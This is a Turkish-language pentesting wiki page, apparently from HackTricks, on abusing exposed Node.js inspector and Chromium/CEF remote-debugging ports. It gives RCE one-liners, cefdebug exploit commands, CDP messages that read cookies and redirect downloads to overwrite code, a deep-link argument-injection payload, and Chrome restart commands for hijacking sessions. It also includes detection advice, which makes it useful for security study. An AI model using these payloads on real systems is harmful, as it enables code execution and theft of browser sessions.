# Node inspector/CEF debug kötüye kullanımı

{{#include ../../banners/hacktricks-training.md}}

Geçmişteki pratik örnekler arasında Multimaster walkthrough ve CVE-2019-1414 Visual Studio Code debugger saldırısı yer alır; her güncel Electron veya Chromium hedefinin aynı temel özellikleri sunduğunu varsaymak yerine bunları sürüme özgü bağlam olarak değerlendirin.<sup>[[1]](#references)[[3]](#references)</sup>

## Temel Bilgiler

[Belgelerden](https://nodejs.org/learn/getting-started/debugging): `--inspect` seçeneğiyle başlatıldığında bir Node.js süreci, bir debugging client için bağlantı dinler. **Varsayılan olarak**, **`127.0.0.1:9229`** host ve portunda dinleme yapar. Her sürece ayrıca **benzersiz** bir **UUID** atanır.<sup>[[4]](#references)</sup>

Inspector client'ları bağlanmak için host adresini, portu ve UUID'yi bilmeli ve belirtmelidir. Tam bir URL şu biçimde olur: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> **Debugger, Node.js yürütme ortamına tam erişime sahip olduğundan**, bu porta bağlanabilen kötü niyetli bir aktör Node.js süreci adına rastgele kod çalıştırabilir (**olası ayrıcalık yükseltme**).<sup>[[4]](#references)</sup>

Inspector'ı başlatmanın birkaç yolu vardır:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

İncelenen bir süreci başlattığınızda buna benzer bir şey görünür:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF** (**Chromium Embedded Framework**) tabanlı süreçler, `--remote-debugging-port=9222` ile bir debugger açığa çıkarabilir. Bu, Node.js inspector yerine tarayıcıyı [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden açığa çıkarır; bu nedenle Node.js `process` tabanlı payload'lar varsayılan olarak doğrudan uygulanamaz.<sup>[[2]](#references)[[5]](#references)</sup>

Debug edilen bir tarayıcıyı başlattığınızda şöyle bir şey görünür:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpoint'ini listeleme ve kullanma

HTTP keşif endpoint'leri, **browser** WebSocket'ini tek tek **target** (sekme, worker, extension vb.) WebSocket'lerinden ayırır. Browser endpoint'i için `/json/version`, target'lar için `/json/list` sorgulanır; döndürülen `webSocketDebuggerUrl` değerleri, CDP'nin JSON-RPC benzeri mesajlarıyla doğrudan kullanılabilir.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Örneğin, `websocat "$BROWSER_WS"` ile bağlanıp `{"id":1,"method":"Target.getTargets"}` veya `{"id":2,"method":"Storage.getCookies"}` gönderin. Bir sayfa hedefinde (`websocat "$PAGE_WS"`), `Runtime.evaluate` ilgili renderer'da çalışır ve `Page.captureScreenshot` base64 kodlu bir ekran görüntüsü döndürür. `document.cookie`, `HttpOnly` çerezlerini gösteremez; `Storage.getCookies` ise tarayıcıdan çerez deposunu ister.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Tarayıcılar, WebSocket'ler ve same-origin-policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Web tarayıcısında açılan web siteleri, tarayıcı güvenlik modeli kapsamında WebSocket ve HTTP istekleri gönderebilir. **Benzersiz bir debugger session id almak** için **başlangıçta bir HTTP bağlantısı** gerekir. **Same-origin-policy**, web sitelerinin **bu HTTP bağlantısını** kurmasını **engeller**. [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**'e** karşı ek güvenlik için Node.js, bağlantının **'Host' headers** değerinin bir **IP address** veya tam olarak **`localhost`** belirttiğini doğrular.<sup>[[4]](#references)</sup>

> [!TIP]
> Bu **güvenlik önlemleri, yalnızca bir HTTP isteği göndererek** (bir SSRF vuln istismar edilerek yapılabilir) **inspector'ı istismar edip kod çalıştırmayı engeller**.<sup>[[4]](#references)</sup>

### Çalışan süreçlerde inspector'ı başlatma

Çalışan bir nodejs sürecine **SIGUSR1 signal** göndererek **inspector'ın** varsayılan portta **başlamasını** sağlayabilirsiniz. Ancak yeterli ayrıcalığa sahip olmanız gerektiğini unutmayın; bu size **süreç içindeki bilgilere ayrıcalıklı erişim** sağlayabilir, ancak doğrudan bir privilege escalation sağlamaz.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Bu, container'larda kullanışlıdır; çünkü **process'i kapatıp `--inspect` ile yeni bir process başlatmak** bir seçenek **değildir**; process ile birlikte **container** da **sonlandırılır**.<sup>[[6]](#references)</sup>

### Inspector/debugger'a bağlanma

**Chromium tabanlı bir browser**'a bağlanmak için Chrome'da `chrome://inspect`, Edge'de ise `edge://inspect` URL'lerine erişilebilir. Configure düğmesine tıklayarak **hedef host ve portun** doğru şekilde listelendiğinden emin olun. Görselde bir Remote Code Execution (RCE) örneği gösterilmektedir:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger'a erişmek için kullanılacak bir URL görünecektir. Örneğin ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Inspector/debugger'a bağlanma: Chromium tabanlı bir browser'a bağlanmak için,...](<../../images/image (674).png>)

**Komut satırını** kullanarak bir debugger/inspector'a şu şekilde bağlanabilirsiniz:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) aracı, yerel olarak çalışan **inspector'ları bulmayı** ve bunlara **kod enjekte etmeyi** sağlar.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) üzerinden bir tarayıcıya bağlanıldığında **NodeJS RCE exploit'lerinin çalışmayacağını** unutmayın (ilginç işlemler yapmak için API'yi incelemeniz gerekir).<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector'da RCE

> [!TIP]
> Buraya [**Electron'da bir XSS'ten RCE elde etmeyi öğrenmek için geldiyseniz bu sayfaya göz atın.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Bir Node **inspector**'a **bağlanabildiğinizde** **RCE** elde etmenin yaygın yollarından bazıları şunlardır (görünen o ki bu, **Chrome DevTools protocol** bağlantısında çalışmayacaktır):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

API'yi buradan inceleyebilirsiniz: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Bu bölümde, insanların bu protokolü istismar etmek için kullandığını gördüğüm ilginç yöntemleri listeleyeceğim.

### Chrome 136+ varsayılan profil kısıtlaması

**Chrome 136** ile birlikte Chrome, **varsayılan Chrome veri dizinini** hedeflediklerinde `--remote-debugging-port` ve `--remote-debugging-pipe` seçeneklerini yok sayar. Bu seçeneklerin, ayrı şifreleme anahtarı ve yalıtılmış tarayıcı durumu kullanarak basit bayrak tabanlı yöntemin kullanıcının normal kimlik doğrulaması yapılmış profilini açığa çıkarmasını engelleyen standart dışı bir `--user-data-dir` ile birlikte kullanılması gerekir. Doğrulamadan, Chrome'a özgü bu kısıtlamanın eski Chrome sürümlerini, Chrome for Testing'i, Electron/CEF uygulamalarını veya diğer Chromium türevlerini kapsadığı varsayılmamalıdır.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Bu nedenle, yalnızca `--remote-debugging-port` ile başlatılmış etkin bir Chrome süreci görmek, CDP'nin etkinleştiğini **kanıtlamaz**. Dinleyiciyi ve `/json/version` uç noktasını doğrulayın ve hangi profilin kullanıldığını belirleyin.<sup>[[14]](#references)</sup>

### Deep Links Üzerinden Parameter Injection

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kapsamında Rhino Security, CEF tabanlı bir uygulamanın sistemde özel bir URI'yi (workspaces://index.html) **kaydettiğini**; bu URI'nin tam URI'yi aldığını ve ardından bu URI'den kısmen oluşturulmuş bir yapılandırmayla **CEF tabanlı uygulamayı başlattığını** keşfetti.<sup>[[8]](#references)</sup>

URI parametrelerinin URL decode edildiği ve CEF tabanlı uygulamayı başlatmak için kullanıldığı keşfedildi. Bu, kullanıcının komut satırına **`--gpu-launcher`** flag'ini **enjekte etmesine** ve keyfi işlemler yürütmesine olanak tanıyordu.<sup>[[8]](#references)</sup>

Yani, şöyle bir payload:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Bir calc.exe çalıştıracaktır.<sup>[[8]](#references)</sup>

### Dosyaların Üzerine Yazma

**İndirilen dosyaların kaydedileceği** klasörü değiştirin ve uygulamanın sık kullanılan **kaynak kodunu**, **kötü amaçlı kodunuzla** **üzerine yazmak** için bir dosya indirin.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE ve veri sızdırma

STAR Labs, açıkta kalan WebDriver/CDP servislerinin keyfi dosya okumaya ve RCE'ye olanak sağlayabileceğini; bazı yapılandırmalarda DNS rebinding'in exploit zincirini tamamlayabileceğini gösterdi.<sup>[[9]](#references)</sup>

ChromeDriver'ın WebDriver servisi, Chrome DevTools/CDP'den ayrıdır. [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities), yeni bir oturum için başlatılacak tarayıcı yürütülebilir dosyasını seçer. Yetkisiz bir çağıran, root olarak çalışan bir ChromeDriver servisine erişebiliyor ve çağıranın denetimindeki yürütülebilir dosya yoluyla bir oturum gönderebiliyorsa, bu başlatma servisinin ayrıcalık sınırını aşabilir. Boş bir `/sessions` yanıtı, yeni oturum oluşturulup oluşturulamayacağını kesin olarak göstermez. Bu yolun kullanılabilir olduğu sonucuna varmadan önce süreç sahibini, dinleyiciye gerçekten erişilip erişilemediğini, oturum yetkilendirmesini, yürütülebilir dosyaya erişimi ve kısıtlamaları inceleyin; yalnızca süreç adı veya yaygın kullanılan port yeterli değildir. [Google'ın güvenlik kılavuzu](https://developer.chrome.com/docs/chromedriver/security-considerations), ChromeDriver'ın yetkisiz bir hesap altında çalıştırılmasını önerir. Pasif numaralandırma bir WebDriver oturumu oluşturmamalıdır.

Tarayıcı otomasyonu ve Chromium güvenliğiyle ilgili geçmiş vakalar için Counter WebDriver yazısına ve Project Zero'nun 773, 1742 ve 1944 numaralı sorunlarına bakın.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Çalışan bir Chromium sürecinde CDP'yi etkinleştirme

Windows'ta [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler), komut satırı kısıtlamasının CDP'yi etkinleştirmenin tek yolu olmadığını gösterdi: mevcut bir `msedge.exe` sürecine kod enjekte edebilen bir kod, Chromium'un dışa aktarılmayan `content::DevToolsAgentHost::StartRemoteDebuggingServer` işlevini çağırarak tarayıcıyı yeniden başlatmadan kimliği doğrulanmış canlı profili açığa çıkarabilir.<sup>[[15]](#references)</sup>

Gösterilen zincir, `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` ile bir DLL enjekte eder, dahili Edge sembollerini (önce PDB'lerden, ardından sürüme özgü byte imzalarıyla) çözümler, tarayıcı penceresinin alt sınıfını oluşturur ve son sunucu başlatma çağrısının tarayıcının **UI thread**'inde yürütülmesini sağlayan bir ileti gönderir. Soket loopback'e bağlanır; ardından standart CDP primitive'leri çerezleri alabilir, sekmeleri kaydedebilir, ağ trafiğini inceleyebilir veya kimliği doğrulanmış sayfalarda JavaScript çalıştırabilir.<sup>[[15]](#references)</sup>

> [!WARNING]
> Bu, kimlik doğrulamasız bir ağ atlatma yöntemi değil, **sisteme sızma/süreç enjeksiyonu** tekniğidir. İlgili C++ sembolleri dışa aktarılmadığından ve imzalar tarayıcı güncellemelerinden sonra değişebildiğinden, büyük ölçüde derleme sürümüne bağlıdır.<sup>[[15]](#references)</sup>

Tespit için yalnızca `--remote-debugging-*` komut satırı telemetrisine güvenmeyin: tarayıcı süreçlerine yönelik olağandışı handle ve bellek işlemlerini (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread oluşturma), DLL enjeksiyonunu ve Chrome/Edge'e ait beklenmedik loopback dinleme soketlerini de ilişkilendirin.<sup>[[15]](#references)</sup>

### Post-Exploitation

Gerçek bir ortamda, Chromium tabanlı tarayıcı kullanan bir kullanıcının bilgisayarına **sızdıktan sonra**, geçmişte uygulanan bir teknik tarayıcıyı debugging etkin biçimde yeniden başlatıp loopback portunu yönlendirmekti. Bu, seçilen profili hâlâ kabul eden ürünlerde/derlemelerde kurbanın tarayıcı durumunu açığa çıkarabilir; ancak Chrome 136+ sürümü bunu varsayılan veri dizininde uygulamaz.<sup>[[7]](#references)[[14]](#references)</sup>

Orijinal yeniden başlatma komutu, eski/sürüme özgü hedefler için aşağıda korunmuştur. İkinci komut, güncel Chrome için desteklenen biçimdir; ancak kurbanın normal, kimliği doğrulanmış durumunu yeniden açmak yerine yalıtılmış bir profil oluşturur.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS'e özgü Chromium yeniden başlatma, extension ve CDP tradecraft'i için bkz. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium hata ayıklayıcı inceleme ve istismar aracı](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger aracılığıyla Visual Studio Code'da Uzaktan Kod Yürütme](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Hata Ayıklama Kılavuzu - Başlangıç](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protokolü](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Çözüm Yazısı - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Tarayıcı Oturumlarını Uzaktan Gözlemlemek ve Kontrol Etmek için Chrome'un Hata Ayıklama Özelliğini Kötüye Kullanma](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Uzaktan Kod Yürütme](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Benimle mi Konuşuyorsun? - DNS Rebinding ve CDP aracılığıyla WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [WebDriver'ı Engelleme - Bot'tan RCE'ye](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Sorunu 773 (Chromium hata izleyicisi)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Sorunu 1742 (Chromium hata izleyicisi)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Sorunu 1944 (Chromium hata izleyicisi)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Güvenliği artırmak için uzaktan hata ayıklama anahtarlarında yapılan değişiklikler - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Çalışan Bir Edge Tarayıcısına CDP Enjekte Etme: Çalışma Zamanında Tarayıcı Enstrümantasyonuna Derinlemesine Bakış](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
